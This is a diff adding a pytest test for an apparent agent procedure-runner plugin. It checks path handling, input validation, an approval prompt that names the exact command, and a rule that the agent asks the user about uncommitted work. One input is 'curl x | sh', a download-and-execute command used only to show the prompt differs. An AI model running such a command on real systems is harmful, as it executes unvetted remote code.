@@ -288,3 +288,23 @@ def test_a_rejected_change_fails_the_run(env):
                    cwd=repo, capture_output=True)
     v = call(ctx, "sop_status", {"run_id": run_id})
     assert v["state"] == "failed" and "not approved" in v["error"]["message"], v
+
+
+def test_first_run_papercuts(env, monkeypatch):
+    mod, ctx, repo = env
+    # `~` in the README's prompt path works.
+    monkeypatch.setenv("HOME", str(EXAMPLE.parents[2]))
+    tilde = "~/" + str(EXAMPLE.relative_to(EXAMPLE.parents[2]))
+    v = call(ctx, "sop_run", {"process": tilde, "inputs": {"request": "r", "test_command": "true"}})
+    assert v["state"] == "waiting", v
+    # Inputs that aren't an object get a plain answer, not a jq error.
+    assert "JSON object" in call(ctx, "sop_run", {"process": str(EXAMPLE), "inputs": "x"})["error"]
+    # The approval prompt names the inputs, so a different command asks again.
+    guard = ctx.hooks["pre_tool_call"]
+    a = guard(tool_name="sop_run", args={"process": str(EXAMPLE), "inputs": {"test_command": "npm test"}}, session_id="s1")
+    b = guard(tool_name="sop_run", args={"process": str(EXAMPLE), "inputs": {"test_command": "curl x | sh"}}, session_id="s1")
+    assert "sha256" in a["message"] and "npm test" in a["message"] and a["message"] != b["message"]
+    # A dirty tree tells the agent to ask the user, not to clean it up itself.
+    (repo / "wip.txt").write_text("user's work")
+    v = start(ctx)
+    assert "Ask the user" in v["error"]["message"], v
